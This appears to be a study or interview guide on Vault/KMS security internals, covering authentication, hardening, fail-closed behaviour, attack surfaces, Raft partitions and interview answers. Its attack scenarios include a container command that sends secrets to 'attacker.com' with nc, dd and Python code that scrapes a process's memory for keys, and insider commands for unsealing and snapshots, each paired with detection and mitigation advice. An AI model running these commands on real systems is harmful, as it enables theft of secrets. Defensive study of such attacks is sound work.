    Fetches JWKS: public keys for JWT signature verification
    Validates JWT locally using the public key
    
    Problem: A deleted pod's JWT remains cryptographically valid until expiry.
    If pod is deleted and JWT is stolen: still valid for up to 1 hour.

  Option 2: TokenReview API (slower, more secure)
    Vault calls Kubernetes TokenReview API:
    POST https://kubernetes.default.svc.cluster.local/apis/authentication.k8s.io/v1/tokenreviews
    Authorization: Bearer {token_reviewer_jwt}
    Body: { "spec": { "token": "{submitted_jwt}", "audiences": ["vault"] } }
    
    Kubernetes responds:
    {
      "status": {
        "authenticated": true,
        "user": {
          "username": "system:serviceaccount:payments:payments-service",
          "uid": "11111111-2222-3333-4444-555555555555",
          "groups": ["system:serviceaccounts", "system:authenticated"]
        }
      }
    }
    
    Kubernetes KNOWS if the pod is deleted → returns authenticated=false
    This catches stolen JWTs from deleted pods.

VAULT ROLE CONFIGURATION:
  vault write auth/kubernetes/role/payments-service \
    bound_service_account_names=payments-service \
    bound_service_account_namespaces=payments \
    policies=payments-db-read,payments-tls \
    ttl=1h
  
  WHAT "BOUND" MEANS:
  Even if JWT is cryptographically valid, Vault checks:
  - sub matches: "system:serviceaccount:{namespace}:{sa_name}"
  - namespace is in bound_service_account_namespaces
  - service account name is in bound_service_account_names
  A JWT from "system:serviceaccount:kube-system:default" won't get payments access.
```

---

## 6. Security Controls & Anti-Tampering

### Protecting Vault from Root/Admin Compromise

```
THREAT: Attacker has root shell on the Vault host.
They want to extract secrets from Vault.
What can they do, and what stops them?

ATTACK 1: Read /vault/data/vault.db directly
  Result: All data is AES-256-GCM encrypted with the barrier key.
  Without the barrier key in RAM: pure ciphertext. Unreadable.
  Defense: The barrier key is in RAM, not on disk. No key on disk = no decryption.
  
ATTACK 2: Read /proc/vault_pid/mem to extract barrier key from RAM
  This requires: ptrace capability OR CAP_SYS_PTRACE
  Defense 1: Vault should run with PR_SET_DUMPABLE = 0
    prctl(PR_SET_DUMPABLE, 0)
    This prevents MOST /proc/PID/mem access:
    Even root cannot read /proc/vault_pid/mem if dumpable=0
    (unless they have CAP_SYS_PTRACE explicitly)
  Defense 2: The key pages are marked MADV_DONTDUMP
    If dump happens anyway, key pages excluded
  
  Remaining attack: a process WITH CAP_SYS_PTRACE can bypass dumpable=0
  If root grants themselves CAP_SYS_PTRACE: can still read vault memory
  Final defense: run Vault in a separate user namespace, or run in
  Linux seccomp profile that blocks ptrace syscall for all processes
  targeting Vault's PID.

ATTACK 3: Inject a malicious shared library (LD_PRELOAD)
  Set LD_PRELOAD=/tmp/evil.so → hooks crypto functions → extracts keys
  Defense: Vault binary must run with secure-execution mode
    If binary is SUID or has capabilities: LD_PRELOAD is ignored by linker
    Vault uses CAP_IPC_LOCK → qualifies for secure-execution → LD_PRELOAD ignored
  
ATTACK 4: Replace Vault binary with a modified version
  mv vault vault.bak && cp evil_vault vault
  Next restart: evil vault runs with root access, sends keys to attacker
  Defense 1: IMA (Integrity Measurement Architecture) kernel feature:
    IMA maintains HMAC-SHA256 of every executed file
    Signed with kernel key
    If vault binary is replaced: IMA hash mismatch → kernel DENIES execution
    Requires: IMA policy configured for /usr/bin/vault
  Defense 2: dm-verity (if Vault runs on an immutable OS image)
    Root filesystem is hash-verified at block device level
    Cannot modify files on a dm-verity-protected filesystem at all
  
ATTACK 5: Kernel module rootkit to intercept Vault syscalls
  Load a kernel module that hooks: read(), write(), mmap() for Vault's PID
  Can intercept key material as it flows through the kernel
  Defense: Secure Boot + kernel module signing requirement
    UEFI Secure Boot: bootloader is signed, kernel is signed
    Kernel module signing: CONFIG_MODULE_SIG_FORCE
    Unsigned kernel modules → rejected by kernel
    Even root cannot load an unsigned module
    Only modules signed by the kernel build key (embedded at compile time) are accepted
    
  Caveat: BYOVD (Bring Your Own Vulnerable Driver) — as in ZTA document
  A signed but vulnerable module can be loaded and exploited to execute arbitrary kernel code
  Defense: Load-time eBPF-based module validation + module allowlist
```

---

### Fail-Closed Mechanics

```
VAULT FAIL BEHAVIOR:

Scenario 1: Vault process receives SIGKILL
  Result: Vault stops immediately.
  Key material in RAM: freed by OS on process exit (not zeroed — OS just
  marks pages as free, but they remain in physical RAM until overwritten).
  Risk: Physical memory scraper could recover key material shortly after kill.
  Defense: Vault should install a SIGTERM handler that:
    1. Zeroes all mlocked key pages (SecureZeroMemory equivalent)
    2. Then exits
  For SIGKILL: cannot be caught. Use Linux memory overcommit + aggressive page reuse.

Scenario 2: Vault loses quorum (2 of 3 nodes down in 3-node cluster)
  Result: FAIL CLOSED. The remaining node (if there is one) becomes a follower.
  A follower without quorum refuses ALL write requests (returns 503).
  Read requests: configurable (stale reads possible, or also blocked).
  This is CAP theorem: Vault chooses Consistency over Availability.
  Rationale: A secret management system that serves potentially stale or
  un-authorized secrets is more dangerous than one that is unavailable.

Scenario 3: All audit backends fail
  Result: FAIL CLOSED. Vault stops accepting requests.
  Error: "no audit backends were able to process the request"
  Why: Operating without an audit trail means a compromise might be completely silent.
  The decision to stop operating is a security-first choice.
  The operational impact forces operators to maintain healthy audit backends.
  
  Mitigation: Have multiple audit backends (file + syslog + socket)
  Vault requires: at least ONE must succeed. Having 2 backends:
  - If file backend fails (disk full): syslog still works → Vault continues
  - If BOTH fail: Vault stops (this is the intended behavior)

Scenario 4: HSM connection lost (auto-unseal HSM)
  Result: FAIL CLOSED for NEW secrets / tokens (if HSM needed for crypto operations)
  Existing tokens and leases: continue to work (key material already in RAM)
  New seal/unseal: impossible without HSM
  Rotation operations: impossible without HSM
  The system degrades gracefully for ongoing operations but cannot recover from
  a crash/restart until HSM is available again.

Scenario 5: Vault sealed (mlock keys wiped from RAM)
  Result: COMPLETE FAIL CLOSED. All requests return 503.
  Client experience: "Vault is sealed" error.
  This is intentional: sealing is a security response to a threat.
  Human intervention required to unseal.
```

---

## 7. Attack Surface Mapping

```
╔══════════════════════════════════════════════════════════════════════════════╗
║           VAULT / KMS: COMPLETE ATTACK SURFACE MAP                         ║
╚══════════════════════════════════════════════════════════════════════════════╝

EXTERNAL ATTACK SURFACE
═══════════════════════════════════════════════════════════════════════════════

ENTRY 1: Vault API — HTTPS :8200
  Auth: Token, AppRole, AWS IAM, Kubernetes JWT, OIDC
  What can be reached:
  - /v1/auth/*          → Authentication endpoints (high-value target)
  - /v1/sys/*           → Admin operations (seal, unseal, rotate, rekey)
  - /v1/secret/*        → Secret read/write
  - /v1/pki/*           → Certificate issuance
  Attack: Stolen token → access any secret the token is authorized for
  Attack: Token brute force → HMAC makes this O(2^256) infeasible
  Attack: Authentication bypass in auth method implementation
  Attack: Path traversal in secret path (e.g., ../../../../etc/passwd)
          MITIGATED: Vault normalizes paths, barrier AAD binds to path

ENTRY 2: Vault Cluster API — HTTPS :8201 (internal, between nodes)
  Auth: mTLS with cluster-internal CA certificate
  Used for: Raft replication, leader forwarding
  Attack: Compromise cluster CA key → forge node identity → join as rogue node
  Attack: Network access to 8201 with compromised node cert → Raft manipulation

ENTRY 3: Agent Sidecar (in-pod communication)
  Vault Agent writes secrets to: tmpfs (/vault/secrets/)
  Uses a Unix socket for Agent Cache: vault.sock
  Attack: Another process in the same pod reads secrets from /vault/secrets/
          (possible if pod security context is misconfigured)
  Attack: Process in same pod connects to vault.sock → uses agent's token
          MITIGATED: Agent should use batch tokens, not service tokens
                     Batch tokens cannot be used to create child tokens

INTERNAL ATTACK SURFACE
═══════════════════════════════════════════════════════════════════════════════

ENTRY 4: Vault Host Operating System
  Attack: Root process reads /proc/vault_pid/mem → extract barrier key
  Attack: Replace Vault binary → malicious code on next restart
  Attack: Modify BoltDB file → corrupt storage (not decrypt — modify)

ENTRY 5: Storage Backend (BoltDB / Consul / etcd)
  Attack: Read storage → get encrypted data (cannot decrypt without barrier key)
  Attack: DELETE storage → destroy all secrets (Vault integrity check would fail)
  Attack: Modify storage → corrupt specific secret entries
  Mitigation: AES-GCM authentication tag detects modification (returns error on read)

ENTRY 6: HSM Interface (PKCS#11 / network socket)
  Attack: MITM the HSM network connection → intercept unwrapping operations
  Attack: HSM credential theft → attacker can trigger unseal/re-seal operations
  Attack: HSM command replay → replay an unwrap operation at wrong time

ENTRY 7: Memory (physical RAM)
  Attack: Cold boot attack → freeze RAM → move to another machine → read contents
  Attack: DMA attack (Thunderbolt/PCIe) → directly read RAM → find barrier key
  Mitigation: Run Vault on machines with IOMMU (Intel VT-d) enforced in kernel
              Use SGX enclaves to make RAM encrypted even against physical access

ENTRY 8: Backup / Snapshot Files
  Attack: Vault snapshot contains: encrypted data + encrypted barrier key
          Attacker who has snapshot + can unseal (has shares) can recover all secrets
  Mitigation: Snapshots must be stored encrypted at rest, access-controlled
              Treating a snapshot the same as the live cluster: same unseal process required
```

```
ATTACK SURFACE TOPOLOGY:

[Internet / Internal Network]
         │
         │ HTTPS/TLS
         ▼
[Load Balancer / Ingress]
         │ TLS termination (or passthrough)
         │
         ▼
[Vault API Server :8200]
         │
         ├── Auth Method backends
         │   ├── /v1/auth/kubernetes  → Kubernetes API (external call)
         │   ├── /v1/auth/aws         → AWS STS (external call)
         │   └── /v1/auth/oidc        → IdP (external call)
         │
         ├── Secret Engines
         │   ├── KV v2 → local storage (BoltDB)
         │   ├── PKI → internal CA (in Vault)
         │   └── Database → external DB (calls out to issue dynamic creds)
         │
         ▼
[Barrier Layer] ← All storage R/W passes through here
         │ AES-256-GCM encrypt/decrypt
         │ Key material in mlocked RAM
         ▼
[BoltDB on disk]  ← Only encrypted data, attackers get nothing useful
         │
         │ (separate channel for cluster)
         ▼
[Raft :8201] ← mTLS, node-to-node replication
  [vault-node-2]  [vault-node-3]
         │
[HSM Network :1792]  ← PKCS#11 over TLS (for auto-unseal)
[AWS KMS API]        ← alternative: AWS API for auto-unseal

MEMORY ADDRESS SPACES:
  [Vault PID 1337 memory]
    ├── Barrier key (mlocked, MADV_DONTDUMP)
    ├── Token HMAC key (mlocked, MADV_DONTDUMP)
    ├── HSM session handles
    ├── TLS session keys (ephemeral, in TLS library)
    └── Decrypted secret data (regular heap, NOT mlocked — needs fix)
```

---

## 8. Attack Scenarios

### Scenario 1: Vault Token Theft via Kubernetes Admission Webhook Compromise

**Attacker assumptions:**
- Has compromised the Kubernetes admission webhook infrastructure
- Can modify pod specs as they are admitted to the cluster
- Goal: steal Vault tokens or secrets from target pods

**Step-by-step execution:**

```
PHASE 1: Compromise the Admission Webhook

The admission webhook is a server that intercepts all pod CREATE operations.
It modifies pod specs (e.g., to inject Vault Agent sidecars).
If an attacker compromises this webhook server:

  1. Attacker exploits CVE in the webhook server (RCE via crafted pod spec)
  2. Attacker now controls what the webhook injects into pods

PHASE 2: Inject Malicious Container via Webhook

Normal webhook injection:
  Pod spec arrives → webhook adds vault-agent init container + sidecar

Attacker's modified webhook:
  Pod spec arrives → webhook ALSO adds:
  {
    "name": "debug-container",
    "image": "busybox",
    "command": ["sh", "-c", 
      "cat /vault/secrets/* | nc attacker.com 9999; sleep infinity"],
    "volumeMounts": [{
      "name": "vault-secrets",
      "mountPath": "/vault/secrets"
    }]
  }
  
  The malicious container:
  - Runs in the same pod (shares the tmpfs volume)
  - Reads ALL secrets that Vault Agent wrote to /vault/secrets/
  - Exfiltrates them to attacker's server
  - Also: reads the Vault Agent cache socket (Unix socket)
    → can make authenticated Vault requests using the agent's token

PHASE 3: Extract secrets
  
  From the /vault/secrets/ volume: all secrets in plaintext (files)
  From the vault.sock: attacker's container calls:
    curl --unix-socket /vault/vault.sock http://localhost/v1/secret/data/...
    → Gets ANY secret the Vault Agent token is authorized for
    → This includes secrets NOT yet written to the filesystem
    → Can also enumerate: list all secrets the SA can access

WHERE DETECTION COULD HAPPEN:
  1. Network egress monitoring: pod making outbound TCP to non-allowlisted IP
     (attacker.com:9999) → network policy violation → alert
     
  2. Kubernetes audit logs: pod spec was modified by admission webhook
     Audit log shows: original spec vs. admitted spec
     Unusual containers added by webhook → alert
     
  3. Vault audit log: abnormal volume of read requests from the SA
     "payments-service" reading 50 secrets in 10 seconds → alert
     
  4. Container runtime security (Falco/Tetragon):
     New process in pod: nc / netcat / curl with external IP
     → Falco rule: "Unexpected network connection in payments pod" → alert

WHY THIS WORKS:
  The fundamental issue: Vault Agent has a valid token and writes plaintext to a
  shared filesystem. ANY container in the same pod with access to that volume
  can read the secrets. There's no per-container isolation within a pod.
  
  The Kubernetes security model assumes init containers and sidecars are trusted.
  If the admission webhook that adds those containers is compromised: everything it
  touches is compromised.

MITIGATION:
  1. Vault Agent should write to memory-only locations, NOT shared volumes
     Use Agent's exec/env injection (env variables, not files) for highest isolation
  2. Admission webhook itself should run with Pod Security Admission enforced
  3. Webhook server must require manual approval for changes to the sidecar injection logic
  4. Use Vault Agent with response wrapping: secrets are delivered as single-use
     wrapped tokens, not plaintext. If the file is read by attacker, the wrapped
     token is already consumed → attacker gets nothing on second read.
```

---

### Scenario 2: Vault Barrier Key Extraction via /proc/PID/mem

**Attacker assumptions:**
- Has root access on the Vault host (Linux)
- Vault is NOT running with `PR_SET_DUMPABLE = 0`
- Vault key pages are NOT marked `MADV_DONTDUMP`
- Goal: extract the barrier key and decrypt all stored secrets

```
PHASE 1: Identify Vault memory layout

  $ cat /proc/$(pidof vault)/maps
  Output (relevant sections):
  7f1234000000-7f1234001000 rw-p 00000000 00:00 0  [anon]
  7f1235000000-7f1235001000 rw-p 00000000 00:00 0  [anon]
  7f1236000000-7f1236001000 rw-p 00000000 00:00 0  [anon]
  ...
  
  Attacker needs to find which of these anonymous pages contains the barrier key.
  
  The barrier key is 32 bytes. In memory, it will be preceded by Go runtime
  allocation headers and followed by other data.
  
  Attacker's approach: dump all anonymous pages, then search for patterns
  that indicate key material (high entropy regions with specific lengths).

PHASE 2: Read Vault's memory

  Method 1 (requires dumpable=1):
  $ gcore $(pidof vault)
  Creates: core.$(pidof vault)
  Contains: full memory dump of Vault process
  
  Method 2 (always works as root, if no strict seccomp):
  $ dd if=/proc/$(pidof vault)/mem of=/tmp/vault_mem.bin bs=4096 skip=$((0x7f1234000000/4096)) count=1
  (reads the specific anonymous page at address 0x7f1234000000)
  
  Method 3 (Python, more targeted):
  with open(f'/proc/{vault_pid}/mem', 'rb') as mem:
      for line in open(f'/proc/{vault_pid}/maps'):
          if 'rw-p' in line and 'anon' in line:  # anonymous RW pages
              start, end = [int(x, 16) for x in line.split()[0].split('-')]
              mem.seek(start)
              data = mem.read(end - start)
              # Search for 32-byte regions with Shannon entropy > 7.5 bits/byte
              for offset in range(0, len(data) - 32, 1):
                  region = data[offset:offset+32]
                  if compute_entropy(region) > 7.5:
                      print(f"High-entropy region at {hex(start + offset)}")
                      print(region.hex())

PHASE 3: Identify the barrier key
  
  Vault's AES-256-GCM barrier key has specific properties:
  - Exactly 32 bytes
  - High entropy (uniform bit distribution)
  - Adjacent to Go runtime allocation headers (8 bytes before: size + metadata)
  
  Attacker tests candidate keys:
  for candidate in high_entropy_candidates:
      # Try to decrypt a known entry from vault.db
      try:
          result = aes_256_gcm_decrypt(
              key=candidate,
              data=read_vault_db_entry('/vault/data/vault.db', 'secret/test')
          )
          if result:  # Decryption succeeded (GCM tag verified)
              print(f"FOUND BARRIER KEY: {candidate.hex()}")
      except:
          pass

PHASE 4: Decrypt entire Vault backend
  
  With the barrier key:
  $ python3 decrypt_vault.py --key {barrier_key_hex} --db /vault/data/vault.db --output /tmp/secrets/
  
  All 12,000 secrets decrypted to plaintext JSON files.

WHERE DETECTION COULD HAPPEN:
  1. eBPF monitor on ptrace/read of /proc/vault_pid/mem:
     ANY read of Vault's memory by another process → immediate alert (see §2)
  2. Process accounting: dd / python reading /proc/PID/mem → anomalous I/O
  3. auditd rule: audit on open(/proc/PID/mem) with PID = vault's PID
     auditctl -a exit,always -F arch=b64 -S openat -F path=/proc/$(pidof vault)/mem -F key=vault_mem_access

WHY THIS WORKS (without mitigations):
  Linux /proc/PID/mem grants direct read access to a process's virtual address space.
  Root has read access unless the target process explicitly sets dumpable=0
  (which requires deliberate hardening).
  Even with dumpable=0, a process with CAP_SYS_PTRACE can bypass this.
  The key material, once loaded into RAM, is accessible to sufficiently privileged processes.

MITIGATION:
  1. prctl(PR_SET_DUMPABLE, 0)  → in Vault's startup code
  2. madvise(key_page, PAGE_SIZE, MADV_DONTDUMP)
  3. seccomp profile that blocks ptrace targeting Vault's PID
  4. SELinux/AppArmor policy denying cross-process memory read
  5. Run Vault inside a VM (host-level root cannot read guest memory without hypervisor access)
  6. Run Vault in SGX enclave (root literally cannot read enclave memory — hardware enforced)
```

---

### Scenario 3: Shamir Share Compromise — Insider Threat

**Attacker assumptions:**
- Is an insider (senior sysadmin) who holds 2 of 5 Shamir unseal key shares
- Has social-engineered or coerced one other key holder
- Has physical access to the Vault host (or root access)
- Goal: obtain all secrets without triggering alerts, without other key holders knowing

```
PHASE 1: Obtain 3 Shamir shares (threshold met)

  Attacker holds: Share 1 (legitimately, as their unseal key responsibility)
  Share 2: Obtained via social engineering of Share 2 holder
  Share 3: Obtained via coercion of Share 3 holder (or via shoulder surfing during unseal ceremony)

PHASE 2: Vault is SEALED (perhaps attacker sealed it themselves to justify unseal)

  vault operator seal
  (Any authenticated admin can seal Vault — this requires Vault access, not root)
  
  NOW: Vault is sealed. Barrier key is wiped from RAM.
  Vault backend on disk: contains all secrets, but encrypted.
  All services that depend on Vault: immediately down (fail-closed).
  
  This causes an OUTAGE — but attacker may claim it was accidental or use
  a maintenance window.

PHASE 3: Unseal Vault with the 3 stolen shares

  vault operator unseal {share_1}  → "Vault is unsealing, progress: 1/3"
  vault operator unseal {share_2}  → "Vault is unsealing, progress: 2/3"
  vault operator unseal {share_3}  → "Vault is unsealed and active"
  
  Vault is now operational with the barrier key in RAM.
  Attacker has root access to the host.

PHASE 4: Extract secrets via multiple methods

  Method A: Legitimate API access (if attacker has a root token)
    vault token create -policy=... -orphan → create a token
    vault kv get -mount=secret payments/database/primary
    
  Method B: /proc/PID/mem extraction (if no dumpable protection)
    As described in Scenario 2
    
  Method C: Snapshot extraction
    vault operator raft snapshot save /tmp/backup.snap
    (requires sys/raft capability)
    This creates a snapshot containing ALL encrypted secrets.
    Attacker exfiltrates the snapshot.
    Since they unsealed Vault themselves, they have the barrier key in memory.
    Combine snapshot + barrier key = all secrets.
    
  Method D: Add a new root token
    vault token create -policy=root -orphan -no-default-policy
    (requires root token — if attacker doesn't have the original root token,
     they can generate one with: vault operator generate-root)

WHERE DETECTION COULD HAPPEN:
  1. Vault audit log: seal event + unseal events + timing
     Sealing Vault outside a maintenance window: immediate alert
     vault audit log shows ALL of these events with timestamps
     
  2. HSM audit log: if HSM is used for auto-unseal,
     manual unseal with Shamir shares instead of HSM → unusual pattern → alert
     
  3. Multiple unseal key submissions from different IP addresses / times
     Shamir shares should come from different people in different locations
     If 3 shares come from the SAME IP: suspicious
     
  4. Root token or snapshot operations: high-severity audit events
     These should NEVER happen in normal operations → immediate alert
     
  5. Out-of-hours activity: seal+unseal at 3am → page on-call
  
MITIGATION:
  1. HSM-backed unseal (replace Shamir entirely):
     Requires HSM compromise, not insider share knowledge
     HSM has tamper-evident audit logs independent of Vault
     
  2. PGP-encrypted unseal shares:
     Each share is PGP-encrypted to its holder's public key
     Attacker who steals a share from a holder: can't use it without private key
     
  3. Dual-person integrity for unseal:
     Require that unseal shares come from different authenticated users
     Vault Enterprise: seal wrapping + control groups (N-person approval for operations)
     
  4. Alert on seal operations: vault audit → Slack/PagerDuty immediately
     Any seal operation should wake up the security team
     
  5. Immutable audit logs in separate account:
     Vault audit → Kafka → S3 in separate AWS account
     Attacker who owns the Vault host cannot delete these audit logs
```

---

### Scenario 4: Dynamic Credentials Race Condition Attack

**Attacker assumptions:**
- Has legitimate, limited access to Vault (e.g., read access to one database secrets path)
- Can observe timing of credential rotations
- Goal: access database credentials that belong to another service

```
BACKGROUND: VAULT DATABASE SECRETS ENGINE

  Vault's database secrets engine:
  1. Client requests: GET /v1/database/creds/payments-role
  2. Vault calls database API: CREATE USER payments_svc_1234 WITH PASSWORD 'xyz...'
  3. Vault returns: {username: "payments_svc_1234", password: "xyz...", lease_id: "..."}
  4. Username/password stored in DB, Vault stores lease metadata
  5. At TTL expiry: Vault calls DB API: DROP USER payments_svc_1234
  
  Each credential is DYNAMICALLY CREATED and is valid only for the lease TTL.

ATTACK: Predictable Username Generation (Historical Vault Bug Pattern)

  In some configurations, the generated username is:
  v_{rolename}_{timestamp}_{random6chars}
  Example: v_payments_1716003600_a1b2c3
  
  If timestamp is predictable and random component is weak:
  
  Step 1: Attacker requests credentials for their authorized role
    GET /v1/database/creds/low-priv-role → {username: "v_low_1716003600_x9y8z7"}
  
  Step 2: Observe timestamp pattern
    "Timestamp is Unix epoch in seconds. Random is 6 hex chars."
    Entropy of random component: 24 bits (6 hex chars = 3 bytes)
    
  Step 3: Predict high-privilege credential username
    High-privilege service requests creds at approximately same time
    (can observe timing from database connection logs if attacker has db access)
    Predicted: "v_admin_1716003601_??????" where ?????? has 2^24 = 16M possibilities
    
  Step 4: If database has weak permissions, try to predict/brute the password
    This is usually NOT feasible (password is random 20+ chars)
    
  Realistic attack: exploit the LEASE ID structure
    Vault lease IDs sometimes expose: auth method, role, timestamp
    lease_id = "database/creds/payments-role/abcdefghij1234567890"
    If suffix is predictable: attacker can request renewal of another service's lease
    GET /v1/sys/leases/renew with a guessed lease_id → Vault returns the credentials

WHERE DETECTION COULD HAPPEN:
  403 responses from lease renewal attempts with invalid lease IDs
  High volume of lease renewal attempts from single entity

MITIGATION:
  1. Modern Vault uses cryptographically random lease IDs (UUID v4) → not predictable
  2. Vault checks: only the token that created the lease can renew/revoke it
  3. Usernames: hash-based or UUID-based, not timestamp-based
```

---

## 9. Failure Points & Scaling

### What Fails Under Heavy System Load

**Raft leader election under high write load:**

```
NORMAL STATE:
  Write throughput: 5,000 writes/second (to Vault leader)
  Leader sends AppendEntries to 2 followers for each write
  Each write: committed when 2/3 nodes acknowledge
  Heartbeat interval: 500ms (Raft)
  Election timeout: 1000-2000ms (randomized)

HEAVY LOAD FAILURE PATH:
  Write throughput spikes to 50,000 writes/second (secret rotation storm)
  Leader's Raft goroutine is saturated processing log entries
  
  Problem: Raft heartbeats and AppendEntries share the same goroutine/channel
  If AppendEntries processing is saturated:
    - Heartbeats to followers are delayed
    - Followers don't receive heartbeats within election timeout
    - Followers start an election → leader gets dethroned!
    
  This is a Raft instability under write saturation:
  New leader is elected → inherits all pending writes
  Old leader gets re-elected or different leader wins
  Multiple elections in quick succession → Vault unavailable for seconds per election

DETECTION:
  vault.core.leadership_setup_failed counter
  vault.raft.apply.duration histogram (spikes indicate Raft saturation)
  
MITIGATION:
  1. Rate limit writes at the Vault API gateway level
  2. Tune: raft_heartbeat_timeout > 2× AppendEntries processing time
  3. Scale: use a 5-node cluster (can tolerate 2 node failures, more write headroom)
  4. Use batch writes where possible (avoid thundering herd of secret rotations)

MEMORY PRESSURE (secret cache eviction):

  Vault maintains an in-memory LRU cache of decrypted secrets
  (so frequently-accessed secrets don't require barrier decrypt on every request)
  
  If cache size is insufficient for working set:
    - Every request triggers a storage read + barrier decrypt
    - Barrier decrypt: AES-256-GCM on 4KB = ~1μs (with AES-NI)
    - At 50,000 req/sec: 50ms/sec of pure AES time → manageable
    - But: storage read latency (BoltDB, spinning disk): 5-10ms × 50,000 = 500 seconds/sec
    - Impossible: storage I/O saturates
    
  FAILURE: Vault request latency spikes to seconds, clients time out
  
  MITIGATION:
    Vault cache size defaults to 32,768 entries
    Increase: vault.cache.size in config for large deployments
    Monitor: vault.lru_cache.length and vault.barrier.get.duration

CERTIFICATE ISSUANCE STORM (PKI engine):

  RSA 4096-bit key generation: ~50ms on modern CPU
  At 1,000 cert requests/second: 50,000ms of CPU = 50 CPU-seconds per second
  Requires: 50 CPU cores just for key generation
  
  MITIGATION:
    1. Pre-generate key pairs and cache them (risky: pre-generated keys can be enumerated)
    2. Use EC keys (P-256): key generation ~0.1ms → 100x faster
    3. Use intermediate CA delegation: issue sub-CAs to services, they self-sign leaf certs
    4. Rate limit PKI endpoint: max N certs per minute per issuer
```

---

### Network Partitions and Split-Brain in Vault Raft

```
PARTITION SCENARIO: Network split between Vault nodes

3-Node Cluster:
  vault-node-1 (region A) — Leader
  vault-node-2 (region A)
  vault-node-3 (region B) ← network partition isolates B

BEHAVIOR:
  Partition occurs at T=0.
  
  vault-node-1 + vault-node-2 (majority partition: 2/3):
    Can still achieve quorum: 2/3 nodes
    Continue to elect a leader (may be node-1 or node-2)
    Accept writes and reads normally
    vault-node-3 sends them heartbeats: "I'm alive but my term is stale"
    
  vault-node-3 (minority partition: 1/3):
    Cannot achieve quorum: 1/3 nodes
    If node-3 was the leader BEFORE the partition:
      It immediately STEPS DOWN because it can't maintain leadership without quorum
      Returns 503 for all write requests: "Leader not found"
    After stepping down: enters follower state, refuses to serve requests
    This is the CORRECT behavior: Vault is consistent-first (CP, not AP)
    
  CAN THERE BE SPLIT-BRAIN?
    In a strict Raft implementation: NO.
    Minority partition CANNOT elect a new leader (needs majority of votes).
    Therefore: only ONE side can be the leader at any time.
    
    The ONLY split-brain risk in practice:
    1. Clock drift: if election timeouts are very close and netsplit is very brief
    2. Bugs in Raft implementation: extremely rare in battle-tested implementations
    3. Asymmetric partition (A→B works, B→A doesn't): can cause leader confusion
       Vault uses bidirectional heartbeats to detect asymmetric partitions.

RECOVERY AFTER PARTITION HEALS:
  vault-node-3 reconnects to majority partition
  vault-node-3 leader is behind in the log
  Majority partition's leader sends: "Your term is stale, here are the missing log entries"
  vault-node-3 applies the missed entries (this is Raft log reconciliation)
  vault-node-3 becomes a follower again, fully synchronized
  
  Time to recover: proportional to number of missed log entries × per-entry apply time
  For a 60-second partition at 1000 writes/second: 60,000 entries to reconcile
  At 10μs per apply: 600ms to catch up

CRITICAL: WHAT HAPPENS TO LEASES DURING PARTITION?

  vault-node-3 was the leader, had 1000 active token leases in memory.
  Partition occurs. Leases are about to expire on vault-node-3 but the lease
  expiry signals are NOT sent (node is isolated).
  
  On the majority partition side: a new leader is elected.
  The new leader has the same lease data (from Raft log replication).
  Leases continue to be managed by the new leader.
  
  When partition heals: vault-node-3 learns it is no longer the leader.
  It discards its in-memory lease management state.
  New leader's state is authoritative.
  
  No duplicate lease renewals, no lost leases: Raft log provides the single source
  of truth for all lease state.

SPLIT-BRAIN PREVENTION IN VAULT ENTERPRISE (DR Replication):
  
  Vault Enterprise supports multi-cluster deployment with:
  - Primary cluster (read/write)
  - DR cluster (standby, for disaster recovery only)
  
  If primary fails and DR is promoted:
  - Manual operator action required (not automatic)
  - This is intentional: automatic failover could create two active primaries
  - Split-brain prevention > operational convenience for a secrets manager
  - Operators must: deliberately execute vault operator dr-operation activate
```

---

## 10. Interview Questions

### Q1: Explain exactly how Vault's barrier works. What happens to the barrier key when Vault is sealed? What's the cryptographic guarantee?

**Direct answer:**

Vault's barrier is the AES-256-GCM encryption layer that sits between all application logic and the storage backend. Every piece of data written to storage passes through it — secrets, tokens, auth state, PKI material. Nothing persists in plaintext.

The barrier key (32 bytes) lives exclusively in process RAM, specifically in a page that's been `mlock()`-ed (preventing swap to disk) and marked `MADV_DONTDUMP` (excluded from core dumps). The barrier key itself is never stored on disk directly — only a version of it encrypted by the master key appears on disk.

When Vault seals: it calls `SecureZeroMemory` (or `memset` + a forced read to prevent compiler optimization) on the barrier key's memory page, then zeroes the master key as well. The process continues running but the barrier key no longer exists in RAM. The stored encrypted version on disk is useless without the master key. The master key itself is split via Shamir — it only existed momentarily in RAM during the unseal process.

The cryptographic guarantee: AES-256-GCM provides both confidentiality (the ciphertext doesn't reveal the plaintext) and authenticity (the GCM tag verifies the ciphertext hasn't been modified). Critically, Vault uses the storage path as Additional Authenticated Data (AAD) — this binds each ciphertext to its location. An attacker who moves a ciphertext from path A to path B will get a GCM authentication failure on read, preventing path confusion attacks where you'd decrypt one secret using another secret's location.

**What if the master key is compromised?** An attacker with the master key can decrypt the barrier key from storage, then decrypt all secrets. This is why the Shamir scheme requires k holders to cooperate — no single person can do this.

---

### Q2: The Go garbage collector can move objects in memory. What does this mean for secret material stored in Go heap objects, and how does Vault handle this? Why is `mlock()` not sufficient on its own?

**Direct answer:**

The Go garbage collector does NOT move objects on the heap (Go's GC is non-moving/non-compacting as of Go 1.x). Unlike Java's JVM or .NET CLR, Go's GC is a concurrent tri-color mark-and-sweep that marks and sweeps in place. Objects don't move. So the specific concern about GC moving key material doesn't apply to Vault's Go implementation.

However, Go's GC creates a different problem: **secret material can be copied**. When Go passes a slice or string containing secret data, it may copy the underlying bytes. The original allocation remains in memory (reachable via the old pointer) until GC collects it. Before GC collection, the old copy sits in heap memory accessible to an attacker.

Example:
```go
// This is dangerous
func processSecret(secret []byte) {
    copy := append([]byte{}, secret...)  // Go creates a new allocation
    // 'secret' still in original memory location
    // 'copy' in new location
    // Both exist until GC collects the old allocation
}
```

`mlock()` prevents the mlocked page from being swapped to disk. But:
1. `mlock()` applies to a specific virtual memory page at a specific address. If Go's runtime copies the secret bytes to a new address (via slice append, string conversion, etc.), the NEW allocation is NOT mlocked.
2. `mlock()` doesn't prevent another process with `ptrace` capability from reading the memory.
3. `mlock()` doesn't protect against cold boot attacks (though it helps by keeping key material in a known location rather than spread across heap).

Vault's real solution: use `memguard` library or similar, which:
1. Wraps the key material in a custom allocator that calls `mlock()` on allocation
2. Provides explicit zeroing before deallocation (`Destroy()`)
3. Surrounds the allocation with guard pages (fatal access if touched — detects overflow)
4. Tracks all copies made of the data and zeros ALL copies on `Destroy()`

